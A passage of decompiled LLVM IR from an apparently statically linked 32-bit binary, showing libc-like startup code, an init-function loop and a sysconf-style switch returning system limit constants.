    i32 25, label %dec_label_pc_8052063
    i32 26, label %dec_label_pc_8052034
    i32 27, label %dec_label_pc_8052057
    i32 28, label %dec_label_pc_8051faa
    i32 29, label %dec_label_pc_805202d
    i32 30, label %dec_label_pc_8051fa2
    i32 31, label %dec_label_pc_8052042
    i32 32, label %dec_label_pc_8052057
    i32 33, label %dec_label_pc_8052057
    i32 34, label %dec_label_pc_8052057
    i32 35, label %dec_label_pc_805203b
    i32 36, label %dec_label_pc_805206a
    i32 37, label %dec_label_pc_8052071
    i32 38, label %dec_label_pc_805206a
    i32 39, label %dec_label_pc_8051fb4
    i32 40, label %dec_label_pc_8052078
    i32 41, label %dec_label_pc_8052057
    i32 42, label %dec_label_pc_8052042
    i32 43, label %dec_label_pc_8052071
    i32 44, label %dec_label_pc_805207f
    i32 45, label %dec_label_pc_8052071
    i32 46, label %dec_label_pc_805202d
    i32 47, label %dec_label_pc_805202d
    i32 48, label %dec_label_pc_805202d
    i32 49, label %dec_label_pc_8052057
    i32 50, label %dec_label_pc_8052057
    i32 51, label %dec_label_pc_805202d
    i32 52, label %dec_label_pc_805202d
    i32 53, label %dec_label_pc_8052057
    i32 54, label %dec_label_pc_8052057
    i32 55, label %dec_label_pc_8052057
    i32 56, label %dec_label_pc_8052057
    i32 57, label %dec_label_pc_8052057
    i32 58, label %dec_label_pc_8052057
    i32 59, label %dec_label_pc_8052057
    i32 60, label %dec_label_pc_8052057
    i32 61, label %dec_label_pc_8052057
    i32 62, label %dec_label_pc_8052057
    i32 63, label %dec_label_pc_8052057
    i32 64, label %dec_label_pc_8052057
    i32 65, label %dec_label_pc_8052057
    i32 66, label %dec_label_pc_8052057
    i32 67, label %dec_label_pc_8051f58
    i32 68, label %dec_label_pc_8051f58
    i32 69, label %dec_label_pc_805203b
    i32 70, label %dec_label_pc_805203b
    i32 71, label %dec_label_pc_805203b
    i32 72, label %dec_label_pc_8052042
    i32 73, label %dec_label_pc_8052049
    i32 74, label %dec_label_pc_8052050
    i32 75, label %dec_label_pc_8051fbe
    i32 76, label %dec_label_pc_8052050
    i32 77, label %dec_label_pc_8051f58
    i32 78, label %dec_label_pc_8051f58
    i32 79, label %dec_label_pc_8051f58
    i32 80, label %dec_label_pc_8051f58
    i32 81, label %dec_label_pc_8051f58
    i32 82, label %dec_label_pc_8051f58
    i32 83, label %dec_label_pc_8051f58
    i32 84, label %dec_label_pc_8051f58
    i32 85, label %dec_label_pc_8052057
    i32 86, label %dec_label_pc_8052057
    i32 87, label %dec_label_pc_8052034
    i32 88, label %dec_label_pc_8051fc8
    i32 89, label %dec_label_pc_8051fd2
    i32 90, label %dec_label_pc_8052049
    i32 91, label %dec_label_pc_8051f58
    i32 92, label %dec_label_pc_8051f58
    i32 93, label %dec_label_pc_8051f58
    i32 94, label %dec_label_pc_8051f58
    i32 95, label %dec_label_pc_805202d
    i32 96, label %dec_label_pc_8052057
    i32 97, label %dec_label_pc_8052057
    i32 98, label %dec_label_pc_8051f58
    i32 99, label %dec_label_pc_8051f58
    i32 100, label %dec_label_pc_8051f58
    i32 101, label %dec_label_pc_8051fdc
    i32 102, label %dec_label_pc_805201f
    i32 103, label %dec_label_pc_805205c
    i32 104, label %dec_label_pc_8052034
    i32 105, label %dec_label_pc_8051fe6
    i32 106, label %dec_label_pc_8052042
    i32 107, label %dec_label_pc_8052042
    i32 108, label %dec_label_pc_8052026
    i32 109, label %dec_label_pc_8052063
    i32 110, label %dec_label_pc_805207f
    i32 111, label %dec_label_pc_805201f
    i32 112, label %dec_label_pc_805205c
    i32 113, label %dec_label_pc_805207f
    i32 114, label %dec_label_pc_8051ff0
    i32 115, label %dec_label_pc_8052078
    i32 116, label %dec_label_pc_8052057
    i32 117, label %dec_label_pc_8052057
    i32 118, label %dec_label_pc_8051ffa
    i32 119, label %dec_label_pc_8052004
    i32 120, label %dec_label_pc_8052071
    i32 121, label %dec_label_pc_8052034
    i32 122, label %dec_label_pc_8052034
    i32 123, label %dec_label_pc_8052034
    i32 124, label %dec_label_pc_8052034
    i32 125, label %dec_label_pc_8051f58
    i32 126, label %dec_label_pc_8051f58
    i32 127, label %dec_label_pc_8052057
    i32 128, label %dec_label_pc_8052057
    i32 129, label %dec_label_pc_8051f58
    i32 130, label %dec_label_pc_8051f58
    i32 131, label %dec_label_pc_8052057
    i32 149, label %dec_label_pc_805200b
  ]

dec_label_pc_8051f58:                             ; preds = %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43
  br label %dec_label_pc_8052084

dec_label_pc_8051f62:                             ; preds = %dec_label_pc_8051f43
  %v1_8051f62 = call i32 @function_805076b(i32 ptrtoint (i32* @0 to i32))
  %v1_8051f67 = inttoptr i32 %v1_8051f62 to i32*
  store i32 22, i32* %v1_8051f67, align 4
  br label %dec_label_pc_8052057

dec_label_pc_8051f72:                             ; preds = %dec_label_pc_8051f43
  br label %dec_label_pc_8052084

dec_label_pc_8051f7c:                             ; preds = %dec_label_pc_8051f43
  br label %dec_label_pc_8052084

dec_label_pc_8051f86:                             ; preds = %dec_label_pc_8051f43
  br label %dec_label_pc_8052084

dec_label_pc_8051f90:                             ; preds = %dec_label_pc_8051f43
  %v0_8051f93 = call i32 @function_805268d()
  br label %dec_label_pc_8051f98

dec_label_pc_8051f98:                             ; preds = %dec_label_pc_8051f43, %dec_label_pc_8051f90
  br label %dec_label_pc_8052084

dec_label_pc_8051fa2:                             ; preds = %dec_label_pc_8051f43
  %v0_8051fa5 = call i32 @function_8052724()
  br label %dec_label_pc_8051faa

dec_label_pc_8051faa:                             ; preds = %dec_label_pc_8051f43, %dec_label_pc_8051fa2
  br label %dec_label_pc_8052084

dec_label_pc_8051fb4:                             ; preds = %dec_label_pc_8051f43
  br label %dec_label_pc_8052084

dec_label_pc_8051fbe:                             ; preds = %dec_label_pc_8051f43
  br label %dec_label_pc_8052084

dec_label_pc_8051fc8:                             ; preds = %dec_label_pc_8051f43
  br label %dec_label_pc_8052084

dec_label_pc_8051fd2:                             ; preds = %dec_label_pc_8051f43
  br label %dec_label_pc_8052084

dec_label_pc_8051fdc:                             ; preds = %dec_label_pc_8051f43
  br label %dec_label_pc_8052084

dec_label_pc_8051fe6:                             ; preds = %dec_label_pc_8051f43
  br label %dec_label_pc_8052084

dec_label_pc_8051ff0:                             ; preds = %dec_label_pc_8051f43
  br label %dec_label_pc_8052084

dec_label_pc_8051ffa:                             ; preds = %dec_label_pc_8051f43
  br label %dec_label_pc_8052084

dec_label_pc_8052004:                             ; preds = %dec_label_pc_8051f43
  br label %dec_label_pc_8052084

dec_label_pc_805200b:                             ; preds = %dec_label_pc_8051f43
  %v5_8052011 = call i32 @function_8052490(i32 1, %timespec* null, i32 149, i32 149)
  %v2_8052019 = icmp slt i32 %v5_8052011, 0
  %v1_805201b = icmp eq i1 %v2_8052019, false
  br i1 %v1_805201b, label %dec_label_pc_805202d, label %dec_label_pc_8052057

dec_label_pc_805201f:                             ; preds = %dec_label_pc_8051f43, %dec_label_pc_8051f43
  br label %dec_label_pc_8052084

dec_label_pc_8052026:                             ; preds = %dec_label_pc_8051f43, %dec_label_pc_8051f43
  br label %dec_label_pc_8052084

dec_label_pc_805202d:                             ; preds = %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_805200b
  br label %dec_label_pc_8052084

dec_label_pc_8052034:                             ; preds = %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43
  br label %dec_label_pc_8052084

dec_label_pc_805203b:                             ; preds = %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43
  br label %dec_label_pc_8052084

dec_label_pc_8052042:                             ; preds = %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43
  br label %dec_label_pc_8052084

dec_label_pc_8052049:                             ; preds = %dec_label_pc_8051f43, %dec_label_pc_8051f43
  br label %dec_label_pc_8052084

dec_label_pc_8052050:                             ; preds = %dec_label_pc_8051f43, %dec_label_pc_8051f43
  br label %dec_label_pc_8052084

dec_label_pc_8052057:                             ; preds = %dec_label_pc_805200b, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f62
  br label %dec_label_pc_8052084

dec_label_pc_805205c:                             ; preds = %dec_label_pc_8051f43, %dec_label_pc_8051f43
  br label %dec_label_pc_8052084

dec_label_pc_8052063:                             ; preds = %dec_label_pc_8051f43, %dec_label_pc_8051f43
  br label %dec_label_pc_8052084

dec_label_pc_805206a:                             ; preds = %dec_label_pc_8051f43, %dec_label_pc_8051f43
  br label %dec_label_pc_8052084

dec_label_pc_8052071:                             ; preds = %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43
  br label %dec_label_pc_8052084

dec_label_pc_8052078:                             ; preds = %dec_label_pc_8051f43, %dec_label_pc_8051f43
  br label %dec_label_pc_8052084

dec_label_pc_805207f:                             ; preds = %dec_label_pc_8051f43, %dec_label_pc_8051f43, %dec_label_pc_8051f43
  br label %dec_label_pc_8052084

dec_label_pc_8052084:                             ; preds = %dec_label_pc_8052078, %dec_label_pc_8052071, %dec_label_pc_805206a, %dec_label_pc_8052063, %dec_label_pc_805205c, %dec_label_pc_8052050, %dec_label_pc_8052049, %dec_label_pc_8052042, %dec_label_pc_805203b, %dec_label_pc_8052034, %dec_label_pc_8052026, %dec_label_pc_805201f, %dec_label_pc_805202d, %dec_label_pc_8052004, %dec_label_pc_8051ffa, %dec_label_pc_8051ff0, %dec_label_pc_8051fe6, %dec_label_pc_8051fdc, %dec_label_pc_8051fd2, %dec_label_pc_8051fc8, %dec_label_pc_8051fbe, %dec_label_pc_8051fb4, %dec_label_pc_8051faa, %dec_label_pc_8051f98, %dec_label_pc_8051f86, %dec_label_pc_8051f7c, %dec_label_pc_8051f72, %dec_label_pc_8051f58, %dec_label_pc_8052057, %dec_label_pc_805207f
  %v0_8052087 = phi i32 [ 255, %dec_label_pc_8052078 ], [ 2048, %dec_label_pc_8052071 ], [ 99, %dec_label_pc_805206a ], [ 20, %dec_label_pc_8052063 ], [ -128, %dec_label_pc_805205c ], [ 1024, %dec_label_pc_8052050 ], [ 4, %dec_label_pc_8052049 ], [ 32, %dec_label_pc_8052042 ], [ 256, %dec_label_pc_805203b ], [ 2147483647, %dec_label_pc_8052034 ], [ 16, %dec_label_pc_8052026 ], [ 127, %dec_label_pc_805201f ], [ 200112, %dec_label_pc_805202d ], [ 9, %dec_label_pc_8052004 ], [ 65535, %dec_label_pc_8051ffa ], [ -32768, %dec_label_pc_8051ff0 ], [ -2147483648, %dec_label_pc_8051fe6 ], [ 8, %dec_label_pc_8051fdc ], [ 500, %dec_label_pc_8051fd2 ], [ 4096, %dec_label_pc_8051fc8 ], [ 16384, %dec_label_pc_8051fbe ], [ 1000, %dec_label_pc_8051fb4 ], [ 32768, %dec_label_pc_8051faa ], [ 6, %dec_label_pc_8051f98 ], [ 65536, %dec_label_pc_8051f86 ], [ 100, %dec_label_pc_8051f7c ], [ 131072, %dec_label_pc_8051f72 ], [ 1, %dec_label_pc_8051f58 ], [ -1, %dec_label_pc_8052057 ], [ 32767, %dec_label_pc_805207f ]
  ret i32 %v0_8052087

; uselistorder directives
  uselistorder i32 65536, { 28, 29, 3, 4, 5, 6, 7, 8, 10, 9, 11, 13, 14, 12, 15, 17, 16, 18, 1, 19, 0, 2, 22, 20, 23, 21, 26, 24, 25, 27 }
  uselistorder i32 16384, { 0, 5, 6, 7, 8, 9, 10, 11, 24, 25, 22, 23, 16, 17, 20, 21, 18, 19, 1, 2, 3, 4, 14, 15, 26, 27, 28, 29, 12, 13 }
  uselistorder i32 65535, { 3, 0, 1, 2 }
  uselistorder i32 2048, { 3, 1, 4, 2, 0 }
  uselistorder i32 255, { 0, 2, 3, 4, 1 }
  uselistorder i32 149, { 1, 0, 2 }
  uselistorder i32 127, { 0, 2, 1 }
  uselistorder i32 123, { 1, 0 }
  uselistorder i32 118, { 1, 0 }
  uselistorder i32 112, { 1, 0 }
  uselistorder i32 110, { 1, 0 }
  uselistorder i32 106, { 1, 0 }
  uselistorder i32 99, { 1, 2, 0 }
  uselistorder i32 95, { 3, 1, 0, 2 }
  uselistorder i32 68, { 2, 0, 1 }
  uselistorder i32 63, { 1, 0, 2 }
  uselistorder i32 60, { 2, 0, 1 }
  uselistorder i32 58, { 1, 0 }
  uselistorder i32 54, { 2, 0, 1 }
  uselistorder i32 38, { 1, 0 }
  uselistorder i32 37, { 1, 0 }
  uselistorder i32 34, { 2, 0, 1 }
  uselistorder i32 27, { 3, 4, 5, 6, 7, 8, 2, 1, 0 }
  uselistorder i32 17, { 6, 4, 5, 2, 3, 1, 0, 7, 8 }
  uselistorder i32 9, { 2, 4, 0, 1, 3, 6, 11, 7, 8, 9, 10, 5, 12 }
  uselistorder i32 6, { 0, 5, 2, 3, 1, 7, 4, 11, 8, 9, 10, 6 }
  uselistorder i32 5, { 5, 0, 7, 8, 13, 10, 11, 12, 6, 4, 3, 1, 2, 9 }
  uselistorder label %dec_label_pc_8052084, { 29, 0, 1, 2, 3, 4, 28, 5, 6, 7, 8, 9, 12, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder label %dec_label_pc_8052057, { 0, 34, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %dec_label_pc_805202d, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8051faa, { 1, 0 }
  uselistorder label %dec_label_pc_8051f98, { 1, 0 }
}

define i32 @function_8052088() local_unnamed_addr {
dec_label_pc_8052088:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052088 = load i32, i32* @ebx, align 4
  store i32 %v0_8052088, i32* %stack_var_-4, align 4
  store i32 add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80542a4.58 to i32), i32 -134562468), i32 2), i32 -1), i32* %ebx.global-to-local, align 4
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80542a4.58 to i32), i32 -134562468), i32 2), i32 0), label %dec_label_pc_805209c, label %dec_label_pc_80520a9

dec_label_pc_805209c:                             ; preds = %dec_label_pc_8052088, %dec_label_pc_805209c
  %v1_80520a38 = phi i32 [ %v1_80520a3, %dec_label_pc_805209c ], [ add (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80542a4.58 to i32), i32 -134562468), i32 2), i32 -1), %dec_label_pc_8052088 ]
  store i32 ptrtoint (i32* @global_var_80520a3.59 to i32), i32* %stack_var_-16, align 4
  %v5_805209c = mul i32 %v1_80520a38, 4
  %v6_805209c = add i32 %v5_805209c, ptrtoint (i32* @global_var_80542a4.58 to i32)
  %v7_805209c = inttoptr i32 %v6_805209c to i32*
  %v8_805209c = load i32, i32* %v7_805209c, align 4
  call void @__pseudo_call(i32 %v8_805209c)
  %v0_80520a3.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_80520a3 = add i32 %v0_80520a3.pre, -1
  store i32 %v1_80520a3, i32* %ebx.global-to-local, align 4
  %v10_80520a4 = icmp eq i32 %v0_80520a3.pre, 0
  %v1_80520a7 = icmp eq i1 %v10_80520a4, false
  br i1 %v1_80520a7, label %dec_label_pc_805209c, label %dec_label_pc_80520a9

dec_label_pc_80520a9:                             ; preds = %dec_label_pc_805209c, %dec_label_pc_8052088
  %v0_80520a9 = load i32, i32* @global_var_80543e8.60, align 8
  %v1_80520ae = icmp eq i32 %v0_80520a9, 0
  br i1 %v1_80520ae, label %dec_label_pc_80520b4, label %dec_label_pc_80520b2

dec_label_pc_80520b2:                             ; preds = %dec_label_pc_80520a9
  %v0_80520b2 = load i32, i32* %stack_var_-16, align 4
  %v1_80520b2 = call i32 @unknown_0(i32 %v0_80520b2)
  br label %dec_label_pc_80520b4

dec_label_pc_80520b4:                             ; preds = %dec_label_pc_80520b2, %dec_label_pc_80520a9
  %v0_80520b4 = load i32, i32* @global_var_80543ec.61, align 4
  store i32 %v0_80520b4, i32* @ecx, align 4
  %v1_80520ba = icmp eq i32 %v0_80520b4, 0
  br i1 %v1_80520ba, label %dec_label_pc_80520c3, label %dec_label_pc_80520be

dec_label_pc_80520be:                             ; preds = %dec_label_pc_80520b4
  %v2_80520be = load i32, i32* %stack_var_-16, align 4
  %v1_80520c1 = call i32 @unknown_0(i32 %v2_80520be)
  br label %dec_label_pc_80520c3

dec_label_pc_80520c3:                             ; preds = %dec_label_pc_80520be, %dec_label_pc_80520b4
  %v2_80520c3 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v2_80520c3

; uselistorder directives
  uselistorder i32 %v1_80520a3, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_805209c, { 1, 0 }
}

define i32 @function_80520c7(i32 %arg1) local_unnamed_addr {
dec_label_pc_80520c7:
  ret i32 0
}

define i32 @function_80520ca(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80520ca:
  %v0_80520ca = load i32, i32* @eax, align 4
  ret i32 %v0_80520ca
}

define i32 @function_80520cb() local_unnamed_addr {
dec_label_pc_80520cb:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %v0_80520cb = load i32, i32* @esi, align 4
  %v0_80520cc = load i32, i32* @ebx, align 4
  %v0_80520d0 = load i32, i32* @eax, align 4
  store i32 %v0_80520d0, i32* @esi, align 4
  %v0_80520d2 = load i32, i32* @edx, align 4
  store i32 %v0_80520d2, i32* @ebx, align 4
  %v4_80520d7 = call i32 @function_805019d(i32 %v0_80520d0, i32 1, i32 %tmp6)
  %v8_80520df = icmp eq i32 %v4_80520d7, -1
  %v1_80520e0 = icmp eq i1 %v8_80520df, false
  br i1 %v1_80520e0, label %dec_label_pc_80520fb, label %dec_label_pc_80520e2

dec_label_pc_80520e2:                             ; preds = %dec_label_pc_80520cb
  %v0_80520e4 = load i32, i32* @ebx, align 4
  %v6_80520ea = call i32 @function_8050344(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8052f8c.62, i32 0, i32 0), i32 %v0_80520e4)
  %v1_80520f2 = load i32, i32* @esi, align 4
  %v12_80520f2 = icmp eq i32 %v6_80520ea, %v1_80520f2
  br i1 %v12_80520f2, label %dec_label_pc_80520fb, label %dec_label_pc_80520f6

dec_label_pc_80520f6:                             ; preds = %dec_label_pc_80520e2
  %v0_80520f6 = call i32 @function_8051aff()
  br label %dec_label_pc_80520fb

dec_label_pc_80520fb:                             ; preds = %dec_label_pc_80520e2, %dec_label_pc_80520cb, %dec_label_pc_80520f6
  %v2_80520fb = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_80520cc, i32* @ebx, align 4
  store i32 %v0_80520cb, i32* @esi, align 4
  ret i32 %v2_80520fb

; uselistorder directives
  uselistorder i32 ()* @function_8051aff, { 0, 4, 3, 2, 1 }
  uselistorder i32 (i8*, i32)* @function_8050344, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_805019d, { 0, 5, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_80520fb, { 2, 0, 1 }
}

define i32 @function_80520ff() local_unnamed_addr {
dec_label_pc_80520ff:
  %v0_8052102 = load i8, i8* @global_var_80543f0.63, align 16
  %v1_8052102 = icmp eq i8 %v0_8052102, 0
  %v1_8052109 = icmp eq i1 %v1_8052102, false
  br i1 %v1_8052109, label %dec_label_pc_80520ff.dec_label_pc_805213b_crit_edge, label %dec_label_pc_805210b

dec_label_pc_80520ff.dec_label_pc_805213b_crit_edge: ; preds = %dec_label_pc_80520ff
  %v0_805213e.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_805213b

dec_label_pc_805210b:                             ; preds = %dec_label_pc_80520ff
  store i8 1, i8* @global_var_80543f0.63, align 16
  store i32 4096, i32* @global_var_80543e4.64, align 4
  br label %dec_label_pc_805213b

dec_label_pc_805213b:                             ; preds = %dec_label_pc_80520ff.dec_label_pc_805213b_crit_edge, %dec_label_pc_805210b
  %v0_805213e = phi i32 [ %v0_805213e.pre, %dec_label_pc_80520ff.dec_label_pc_805213b_crit_edge ], [ 0, %dec_label_pc_805210b ]
  ret i32 %v0_805213e

; uselistorder directives
  uselistorder i8 1, { 8, 1, 7, 0, 4, 5, 2, 3, 6 }
  uselistorder i8* @global_var_80543f0.63, { 1, 0 }
  uselistorder label %dec_label_pc_805213b, { 1, 0 }
}

define i32 @function_805213f(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_805213f:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %tmp39 = call i32 @__decompiler_undefined_function_0()
  %tmp44 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %tmp44, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_80543dc.65, align 4
  store i32 %arg6, i32* @global_var_80543ec.61, align 4
  %v2_8052176 = mul i32 %arg2, 4
  %v3_8052176 = add i32 %tmp44, %v2_8052176
  store i32 %v3_8052176, i32* %edx.global-to-local, align 4
  %v1_8052179 = add i32 %v3_8052176, 4
  store i32 %v1_8052179, i32* @global_var_80543e0.66, align 32
  %v3_8052181 = load i32, i32* %arg3, align 4
  %v14_8052181 = icmp eq i32 %v1_8052179, %v3_8052181
  %v1_8052183 = icmp eq i1 %v14_8052181, false
  %v1_8052179.v3_8052176 = select i1 %v1_8052183, i32 %v1_8052179, i32 %v3_8052176
  store i32 %v1_8052179.v3_8052176, i32* @global_var_80543e0.66, align 32
  %v0_805218b = load i32, i32* @ecx, align 4
  store i32 %v0_805218b, i32* %stack_var_-160, align 4
  store i32 0, i32* %stack_var_-168, align 4
  %v2_8052190 = ptrtoint i32* %stack_var_-136 to i32
  %v3_8052195 = bitcast i32* %stack_var_-136 to i8*
  %v4_8052195 = call i32 @function_80507bc(i8* %v3_8052195, i32 0, i32 120)
  %v0_805219a = load i32, i32* @global_var_80543e0.66, align 32
  br label %dec_label_pc_80521a2

dec_label_pc_80521a2:                             ; preds = %dec_label_pc_80521a2, %dec_label_pc_805213f
  %v0_80521a2 = phi i32 [ %v1_80521a5, %dec_label_pc_80521a2 ], [ %v0_805219a, %dec_label_pc_805213f ]
  %v1_80521a2 = inttoptr i32 %v0_80521a2 to i32*
  %v2_80521a2 = load i32, i32* %v1_80521a2, align 4
  %v3_80521a2 = icmp eq i32 %v2_80521a2, 0
  %v1_80521a5 = add i32 %v0_80521a2, 4
  %v1_80521a8 = icmp eq i1 %v3_80521a2, false
  br i1 %v1_80521a8, label %dec_label_pc_80521a2, label %dec_label_pc_80521c9.preheader

dec_label_pc_80521c9.preheader:                   ; preds = %dec_label_pc_80521a2
  store i32 %v1_80521a5, i32* @ebx, align 4
  %v1_80521c922 = inttoptr i32 %v1_80521a5 to i32*
  %v2_80521c923 = load i32, i32* %v1_80521c922, align 4
  %v3_80521c924 = icmp eq i32 %v2_80521c923, 0
  %v1_80521cc26 = icmp eq i1 %v3_80521c924, false
  br i1 %v1_80521cc26, label %dec_label_pc_80521ae.lr.ph, label %dec_label_pc_80521ce

dec_label_pc_80521ae.lr.ph:                       ; preds = %dec_label_pc_80521c9.preheader
  %v3_805218e = ptrtoint i32* %stack_var_-168 to i32
  %v3_80521b9 = add i32 %v3_805218e, 32
  br label %dec_label_pc_80521ae

dec_label_pc_80521ae:                             ; preds = %dec_label_pc_80521ae.lr.ph, %dec_label_pc_80521c6
  %v1_80521b9 = phi i32 [ %v2_80521c923, %dec_label_pc_80521ae.lr.ph ], [ %v2_80521c9, %dec_label_pc_80521c6 ]
  %v0_80521b8 = phi i32 [ %v1_80521a5, %dec_label_pc_80521ae.lr.ph ], [ %v1_80521c6, %dec_label_pc_80521c6 ]
  %v6_80521b3 = icmp ugt i32 %v1_80521b9, 14
  br i1 %v6_80521b3, label %dec_label_pc_80521c6, label %dec_label_pc_80521b5

dec_label_pc_80521b5:                             ; preds = %dec_label_pc_80521ae
  %v0_80521b5 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80521b5, i32* %stack_var_-160, align 4
  store i32 %v0_80521b8, i32* %stack_var_-168, align 4
  %v2_80521b9 = mul i32 %v1_80521b9, 8
  %v4_80521b9 = add i32 %v3_80521b9, %v2_80521b9
  %v3_80521be = inttoptr i32 %v4_80521b9 to i16*
  %v4_80521be = call i32 @function_805298a(i16* %v3_80521be, i32 %v0_80521b8, i32 8)
  %v0_80521c6.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80521c6

dec_label_pc_80521c6:                             ; preds = %dec_label_pc_80521ae, %dec_label_pc_80521b5
  %v0_80521c6 = phi i32 [ %v0_80521b8, %dec_label_pc_80521ae ], [ %v0_80521c6.pre, %dec_label_pc_80521b5 ]
  %v1_80521c6 = add i32 %v0_80521c6, 8
  store i32 %v1_80521c6, i32* @ebx, align 4
  %v1_80521c9 = inttoptr i32 %v1_80521c6 to i32*
  %v2_80521c9 = load i32, i32* %v1_80521c9, align 4
  %v3_80521c9 = icmp eq i32 %v2_80521c9, 0
  %v1_80521cc = icmp eq i1 %v3_80521c9, false
  br i1 %v1_80521cc, label %dec_label_pc_80521ae, label %dec_label_pc_80521ce

dec_label_pc_80521ce:                             ; preds = %dec_label_pc_80521c6, %dec_label_pc_80521c9.preheader
  store i32 %v2_8052190, i32* @eax, align 4
  %v0_80521d2 = call i32 @function_8052a5d()
  store i32 %v0_80521d2, i32* @eax, align 4
  %v0_80521d7 = call i32 @function_80520ff()
  %v1_80521e0 = icmp eq i32 %tmp39, 0
  %v1_80521e2 = icmp eq i1 %v1_80521e0, false
  %v1_80521e4 = and i32 %tmp39, -65536
  %v2_80521e4 = or i32 %v1_80521e4, 4096
  %storemerge = select i1 %v1_80521e2, i32 %tmp39, i32 %v2_80521e4
  store i32 %storemerge, i32* @global_var_80543e4.64, align 4
  %v13_80521ed = icmp eq i32 %tmp38, -1
  %v1_80521f2 = icmp eq i1 %v13_80521ed, false
  br i1 %v1_80521f2, label %dec_label_pc_805221d, label %dec_label_pc_80521f4

dec_label_pc_80521f4:                             ; preds = %dec_label_pc_80521ce
  %v0_80521f4 = call i32 @function_8052769()
  store i32 %v0_80521f4, i32* @ebx, align 4
  %v0_80521fb = call i32 @function_80526d8()
  %v0_8052200 = load i32, i32* @ebx, align 4
  %v12_8052200 = icmp eq i32 %v0_8052200, %v0_80521fb
  %v1_8052202 = icmp eq i1 %v12_8052200, false
  br i1 %v1_8052202, label %dec_label_pc_8052233, label %dec_label_pc_8052204

dec_label_pc_8052204:                             ; preds = %dec_label_pc_80521f4
  %v0_8052204 = call i32 @function_80526fe()
  store i32 %v0_8052204, i32* @ebx, align 4
  %v0_805220b = call i32 @function_80526b2()
  %v0_8052210 = load i32, i32* @ebx, align 4
  %v12_8052210 = icmp eq i32 %v0_8052210, %v0_805220b
  %v1_8052212 = icmp eq i1 %v12_8052210, false
  br i1 %v1_8052212, label %dec_label_pc_8052233, label %dec_label_pc_805225d

